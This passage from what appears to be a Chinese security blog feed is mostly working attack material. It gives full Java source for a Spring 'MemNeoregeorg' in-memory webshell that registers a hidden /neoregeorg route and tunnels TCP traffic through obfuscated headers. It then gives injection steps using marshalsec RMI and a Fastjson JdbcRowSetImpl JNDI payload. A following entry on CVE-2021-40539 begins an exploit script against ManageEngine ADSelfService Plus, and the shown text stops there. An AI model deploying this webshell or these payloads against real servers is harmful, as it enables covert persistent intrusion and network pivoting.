class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> java.nio.ByteBuffer;<br><span class="hljs-keyword">import</span> java.nio.channels.SocketChannel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MemNeoregeorg</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] de = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[] &#123;-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">30</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">31</span>,<span class="hljs-number">24</span>,<span class="hljs-number">40</span>,<span class="hljs-number">13</span>,<span class="hljs-number">25</span>,<span class="hljs-number">52</span>,<span class="hljs-number">60</span>,<span class="hljs-number">46</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">19</span>,<span class="hljs-number">43</span>,<span class="hljs-number">37</span>,<span class="hljs-number">0</span>,<span class="hljs-number">54</span>,<span class="hljs-number">15</span>,<span class="hljs-number">42</span>,<span class="hljs-number">16</span>,<span class="hljs-number">56</span>,<span class="hljs-number">3</span>,<span class="hljs-number">44</span>,<span class="hljs-number">34</span>,<span class="hljs-number">50</span>,<span class="hljs-number">53</span>,<span class="hljs-number">14</span>,<span class="hljs-number">33</span>,<span class="hljs-number">62</span>,<span class="hljs-number">21</span>,<span class="hljs-number">12</span>,<span class="hljs-number">17</span>,<span class="hljs-number">27</span>,<span class="hljs-number">63</span>,<span class="hljs-number">41</span>,<span class="hljs-number">49</span>,<span class="hljs-number">2</span>,<span class="hljs-number">48</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">39</span>,<span class="hljs-number">36</span>,<span class="hljs-number">6</span>,<span class="hljs-number">18</span>,<span class="hljs-number">22</span>,<span class="hljs-number">58</span>,<span class="hljs-number">11</span>,<span class="hljs-number">32</span>,<span class="hljs-number">57</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">61</span>,<span class="hljs-number">51</span>,<span class="hljs-number">28</span>,<span class="hljs-number">55</span>,<span class="hljs-number">23</span>,<span class="hljs-number">1</span>,<span class="hljs-number">59</span>,<span class="hljs-number">35</span>,<span class="hljs-number">29</span>,<span class="hljs-number">38</span>,<span class="hljs-number">8</span>,<span class="hljs-number">45</span>,<span class="hljs-number">26</span>,<span class="hljs-number">47</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span>[] en = <span class="hljs-string">&quot;DqYJ7zckvj8gS2OFHTdA9Rep03xUnt+/hPLsbCua1WGBKw6yZXMm4NEoIifr5lQV&quot;</span>.toCharArray();<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MemNeoregeorg</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.<br>                currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        Method method = Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        <span class="hljs-comment">// 属性被 private 修饰，所以 setAccessible true</span><br>        method.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 通过反射获得该类的test方法</span><br>        Method method2 = MemNeoregeorg.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-comment">// 定义该controller的path</span><br>        PatternsRequestCondition url = <span class="hljs-keyword">new</span> PatternsRequestCondition(<span class="hljs-string">&quot;/neoregeorg&quot;</span>);<br>        <span class="hljs-comment">// 定义允许访问的HTTP方法</span><br>        RequestMethodsRequestCondition ms = <span class="hljs-keyword">new</span> RequestMethodsRequestCondition();<br>        <span class="hljs-comment">// 在内存中动态注册 controller</span><br>        RequestMappingInfo info = <span class="hljs-keyword">new</span> RequestMappingInfo(url, ms, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-comment">// 创建用于处理请求的对象，避免无限循环使用另一个构造方法</span><br>        MemNeoregeorg injectToController = <span class="hljs-keyword">new</span> MemNeoregeorg(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">// 将该controller注册到Spring容器</span><br>        mappingHandlerMapping.registerMapping(info, injectToController, method2);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">MemNeoregeorg</span><span class="hljs-params">(String aaa)</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">puts</span><span class="hljs-params">(HttpServletResponse r, String str)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bs = str.getBytes();<br>        ServletOutputStream so = r.getOutputStream();<br>        so.write(bs, <span class="hljs-number">0</span>, bs.length);<br>        so.close();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">b64en</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] data)</span> </span>&#123;<br>        StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer();<br>        <span class="hljs-keyword">int</span> len = data.length;<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> b1, b2, b3;<br>        <span class="hljs-keyword">while</span> (i &lt; len) &#123;<br>            b1 = data[i++] &amp; <span class="hljs-number">0xff</span>;<br>            <span class="hljs-keyword">if</span> (i == len) &#123;<br>                sb.append(en[b1 &gt;&gt;&gt; <span class="hljs-number">2</span>]);<br>                sb.append(en[(b1 &amp; <span class="hljs-number">0x3</span>) &lt;&lt; <span class="hljs-number">4</span>]);<br>                sb.append(<span class="hljs-string">&quot;==&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            b2 = data[i++] &amp; <span class="hljs-number">0xff</span>;<br>            <span class="hljs-keyword">if</span> (i == len) &#123;<br>                sb.append(en[b1 &gt;&gt;&gt; <span class="hljs-number">2</span>]);<br>                sb.append(en[((b1 &amp; <span class="hljs-number">0x03</span>) &lt;&lt; <span class="hljs-number">4</span>)<br>                        | ((b2 &amp; <span class="hljs-number">0xf0</span>) &gt;&gt;&gt; <span class="hljs-number">4</span>)]);<br>                sb.append(en[(b2 &amp; <span class="hljs-number">0x0f</span>) &lt;&lt; <span class="hljs-number">2</span>]);<br>                sb.append(<span class="hljs-string">&quot;=&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            b3 = data[i++] &amp; <span class="hljs-number">0xff</span>;<br>            sb.append(en[b1 &gt;&gt;&gt; <span class="hljs-number">2</span>]);<br>            sb.append(en[((b1 &amp; <span class="hljs-number">0x03</span>) &lt;&lt; <span class="hljs-number">4</span>)<br>                    | ((b2 &amp; <span class="hljs-number">0xf0</span>) &gt;&gt;&gt; <span class="hljs-number">4</span>)]);<br>            sb.append(en[((b2 &amp; <span class="hljs-number">0x0f</span>) &lt;&lt; <span class="hljs-number">2</span>)<br>                    | ((b3 &amp; <span class="hljs-number">0xc0</span>) &gt;&gt;&gt; <span class="hljs-number">6</span>)]);<br>            sb.append(en[b3 &amp; <span class="hljs-number">0x3f</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] b64de(String str) &#123;<br>        <span class="hljs-keyword">byte</span>[] data = str.getBytes();<br>        <span class="hljs-keyword">int</span> len = data.length;<br>        ByteArrayOutputStream buf = <span class="hljs-keyword">new</span> ByteArrayOutputStream(len);<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> b1, b2, b3, b4;<br>        <span class="hljs-keyword">while</span> (i &lt; len) &#123;<br>            <span class="hljs-keyword">do</span> &#123;<br>                b1 = de[data[i++]];<br>            &#125; <span class="hljs-keyword">while</span> (i &lt; len &amp;&amp; b1 == -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (b1 == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">do</span> &#123;<br>                b2 = de[data[i++]];<br>            &#125; <span class="hljs-keyword">while</span> (i &lt; len &amp;&amp; b2 == -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (b2 == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            buf.write((<span class="hljs-keyword">int</span>) ((b1 &lt;&lt; <span class="hljs-number">2</span>) | ((b2 &amp; <span class="hljs-number">0x30</span>) &gt;&gt;&gt; <span class="hljs-number">4</span>)));<br>            <span class="hljs-keyword">do</span> &#123;<br>                b3 = data[i++];<br>                <span class="hljs-keyword">if</span> (b3 == <span class="hljs-number">61</span>) &#123;<br>                    <span class="hljs-keyword">return</span> buf.toByteArray();<br>                &#125;<br>                b3 = de[b3];<br>            &#125; <span class="hljs-keyword">while</span> (i &lt; len &amp;&amp; b3 == -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (b3 == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            buf.write((<span class="hljs-keyword">int</span>) (((b2 &amp; <span class="hljs-number">0x0f</span>) &lt;&lt; <span class="hljs-number">4</span>) | ((b3 &amp; <span class="hljs-number">0x3c</span>) &gt;&gt;&gt; <span class="hljs-number">2</span>)));<br>            <span class="hljs-keyword">do</span> &#123;<br>                b4 = data[i++];<br>                <span class="hljs-keyword">if</span> (b4 == <span class="hljs-number">61</span>) &#123;<br>                    <span class="hljs-keyword">return</span> buf.toByteArray();<br>                &#125;<br>                b4 = de[b4];<br>            &#125; <span class="hljs-keyword">while</span> (i &lt; len &amp;&amp; b4 == -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (b4 == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            buf.write((<span class="hljs-keyword">int</span>) (((b3 &amp; <span class="hljs-number">0x03</span>) &lt;&lt; <span class="hljs-number">6</span>) | b4));<br>        &#125;<br>        <span class="hljs-keyword">return</span> buf.toByteArray();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">// 获取request和response对象</span><br>        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br>        HttpSession session=request.getSession();<br><br>        response.setStatus(<span class="hljs-number">200</span>);<br>        String cmd = request.getHeader(<span class="hljs-string">&quot;Cz&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>) &#123;<br>            String mark = cmd.substring(<span class="hljs-number">0</span>,<span class="hljs-number">22</span>);<br>            cmd = cmd.substring(<span class="hljs-number">22</span>);<br>            response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd.compareTo(<span class="hljs-string">&quot;GVwydX22KEDdLXVNICQlK7VigwqOr1&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    String[] target_ary = <span class="hljs-keyword">new</span> String(b64de(request.getHeader(<span class="hljs-string">&quot;Ahjncviespbziuar&quot;</span>))).split(<span class="hljs-string">&quot;\\|&quot;</span>);<br>                    String target = target_ary[<span class="hljs-number">0</span>];<br>                    <span class="hljs-keyword">int</span> port = Integer.parseInt(target_ary[<span class="hljs-number">1</span>]);<br>                    SocketChannel socketChannel = SocketChannel.open();<br>                    socketChannel.connect(<span class="hljs-keyword">new</span> InetSocketAddress(target, port));<br>                    socketChannel.configureBlocking(<span class="hljs-keyword">false</span>);<br>                    session.setAttribute(mark, socketChannel);<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    response.setHeader(<span class="hljs-string">&quot;Rhikuunn&quot;</span>, <span class="hljs-string">&quot;2dzkzCC6JbZpMe30VuvalwvNc702mw1QqbKbekOHbKCZmb3gM0JMD3l2&quot;</span>);<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;pmRO3UjyF3OtcU5Z0Ty0epe9VKmObv0nF6fjW&quot;</span>);<br>                &#125;<br>                puts(response, <span class="hljs-string">&quot;&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd.compareTo(<span class="hljs-string">&quot;E4oGJ6dPZO9wSJpJ4kY8AwXJ0UTXs072uvB&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>                SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);<br>                <span class="hljs-keyword">try</span>&#123;<br>                    socketChannel.socket().close();<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>                session.removeAttribute(mark);<br>                puts(response, <span class="hljs-string">&quot;&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd.compareTo(<span class="hljs-string">&quot;wqxFnQchjYWANIpP_2O5&quot;</span>) == <span class="hljs-number">0</span>)&#123;<br>                SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);<br>                <span class="hljs-keyword">try</span>&#123;<br>                    ByteBuffer buf = ByteBuffer.allocate(<span class="hljs-number">513</span>);<br>                    <span class="hljs-keyword">int</span> bytesRead = socketChannel.read(buf);<br>                    ServletOutputStream so = response.getOutputStream();<br>                    <span class="hljs-keyword">while</span> (bytesRead &gt; <span class="hljs-number">0</span>)&#123;<br>                        <span class="hljs-keyword">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[bytesRead];<br>                        System.arraycopy(buf.array(), <span class="hljs-number">0</span>, data, <span class="hljs-number">0</span>, bytesRead);<br>                        <span class="hljs-keyword">byte</span>[] base64 = b64en(data).getBytes();<br>                        so.write(base64, <span class="hljs-number">0</span>, base64.length);<br>                        buf.clear();<br>                        bytesRead = socketChannel.read(buf);<br>                    &#125;<br>                    so.close();<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe&quot;</span>);<br><br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;pmRO3UjyF3OtcU5Z0Ty0epe9VKmObv0nF6fjW&quot;</span>);<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd.compareTo(<span class="hljs-string">&quot;fDVO47AZO6TXX5WT9oQJHTUFgtNTLslwRV6&quot;</span>) == <span class="hljs-number">0</span>)&#123;<br>                SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);<br>                <span class="hljs-keyword">try</span> &#123;<br><br>                    <span class="hljs-keyword">int</span> readlen = request.getContentLength();<br>                    <span class="hljs-keyword">byte</span>[] buff = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[readlen];<br><br>                    request.getInputStream().read(buff, <span class="hljs-number">0</span>, readlen);<br>                    <span class="hljs-keyword">byte</span>[] base64 = b64de(<span class="hljs-keyword">new</span> String(buff));<br>                    ByteBuffer buf = ByteBuffer.allocate(base64.length);<br>                    buf.clear();<br>                    buf.put(base64);<br>                    buf.flip();<br><br>                    <span class="hljs-keyword">while</span>(buf.hasRemaining())<br>                        socketChannel.write(buf);<br><br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe&quot;</span>);<br><br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    response.setHeader(<span class="hljs-string">&quot;Rhikuunn&quot;</span>, <span class="hljs-string">&quot;BUpCTMWYPB0W0z1xw7MBOK26I&quot;</span>);<br>                    response.setHeader(<span class="hljs-string">&quot;Gs&quot;</span>, <span class="hljs-string">&quot;pmRO3UjyF3OtcU5Z0Ty0epe9VKmObv0nF6fjW&quot;</span>);<br>                    socketChannel.socket().close();<br>                &#125;<br>                puts(response, <span class="hljs-string">&quot;&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            puts(response, <span class="hljs-string">&quot;&lt;!-- OnPi3V9A0mDFCR2mjWB6R132S3A1SswOD3XTr6cqcHHSqjksLziNsPtSi5 --&gt;&quot;</span>);<br>        &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="注入过程-1"><a href="#注入过程-1" class="headerlink" title="注入过程"></a>注入过程</h2><p>开启web服务和rmi</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> -m SimpleHTTPServer <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://127.0.0.1:8888/#MemNeoregeorg&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>利用</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:9999/MemNeoregeorg&quot;</span>,<br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/7omIyD"><img src="https://s4.ax1x.com/2022/01/24/7omIyD.png" alt="7omIyD.png"></a></p><p>注入成功</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span>/neoregeorg<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/7om5QO"><img src="https://s4.ax1x.com/2022/01/24/7om5QO.png" alt="7om5QO.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/bitterz/p/14820898.html">针对spring mvc的controller内存马-学习和实验(注入菜刀和冰蝎可用的马) </a></p><p><a href="https://forum.butian.net/share/398">冰蝎内存webshell注入和防检测分析</a></p><p><a href="https://xz.aliyun.com/t/10696">利用shiro反序列化注入冰蝎内存马</a></p><p><a href="https://xz.aliyun.com/t/9050#toc-15">Java安全02-从ClassLoader到冰蝎Java篇</a></p><p><a href="https://www.incert.cn/posts/2def522d.html">记一次修改版冰蝎简单逆向</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484318&idx=1&sn=ece9e52218be0ea84ef166c3bfd20f23&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188&mpshare=1&scene=23&srcid=0531NRPXCZGASzRP4K09dkwb&sharer_sharetime=1642748690856&sharer_shareid=f045ea83ab618e2dffd974c4e052cd1b#rd">冰蝎改造之不改动客户端=&gt;内存马</a></p><p><a href="https://xz.aliyun.com/t/2744">利用动态二进制加密实现新型一句话木马之Java篇</a></p><p><a href="https://paper.seebug.org/1441/#tomcat">中间件内存马注入&amp;冰蝎连接</a></p><p><a href="https://xz.aliyun.com/t/10467#toc-10">利用Fastjson注入Spring内存马</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-40539分析</title>
    <link href="/2021/11/17/CVE-2021-40539%E5%88%86%E6%9E%90/"/>
    <url>/2021/11/17/CVE-2021-40539%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://archives2.manageengine.com/self-service-password/6113/ManageEngine_ADSelfService_Plus_64bit.exe">https://archives2.manageengine.com/self-service-password/6113/ManageEngine_ADSelfService_Plus_64bit.exe</a></p><p>直接下载对应的版本然后再本地搭建</p><p><img src="https://z3.ax1x.com/2021/11/17/I54B3d.png" alt="I54B3d.png"></p><p>配置远程调试</p><p><img src="https://z3.ax1x.com/2021/11/17/I54v8J.png" alt="I54v8J.png"></p><p>修改wrapper.conf，这样即可再IDEA中调试</p><p><img src="https://z3.ax1x.com/2021/11/17/I54UAO.png" alt="I54UAO.png"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">UploadRunCalc</span>(<span class="hljs-params">url</span>):</span><br>    uploadUrl=url+<span class="hljs-string">&quot;./RestAPI/LogonCustomization&quot;</span><br>    <span class="hljs-comment">#files = &#123;&#x27;CERTIFICATE_PATH&#x27;: open(&#x27;1.txt&#x27;, &#x27;rb&#x27;)&#125;</span><br>    files = &#123;<span 